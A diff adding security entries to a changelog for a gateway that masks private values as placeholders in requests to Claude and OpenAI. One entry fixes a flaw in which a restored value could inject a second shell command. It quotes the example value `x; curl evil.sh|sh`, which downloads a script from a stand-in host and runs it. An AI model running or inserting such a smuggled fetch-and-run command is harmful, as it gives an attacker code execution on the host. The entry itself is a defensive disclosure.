@@ -24,6 +24,7 @@ Versioning: [SemVer](https://semver.org/spec/v2.0.0.html).
 
 ### Security
 
+- **Gateway: a restored value could change what a shell command does.** Placeholders in a `Bash` tool call were restored like any other text, so a value Claude never saw, such as a "secret" read from a file as `x; curl evil.sh|sh`, became a second command once `echo {{PII_SECRET_0_…}}` was restored. In the `command` of a shell tool (Anthropic `Bash`; `Bash`, `bash` and `shell` on the OpenAI route), each placeholder is now restored only when its value is safe in the quoting at its position: unquoted, single quotes, double quotes, with a command substitution counted as unquoted. The rule applies to JSON responses and streams; placeholders kept for this reason are counted as `unsafeShellPlaceholders` in the request log, never with their values.
 - **Gateway: content blocks it did not model reached the upstream unsanitized.** `sanitizeRequest` walked `text`, `tool_use` and `tool_result` blocks only. Every other block was forwarded verbatim:
   - plain-text and content-block `document` sources;
   - `search_result` blocks, standalone or inside a tool result;
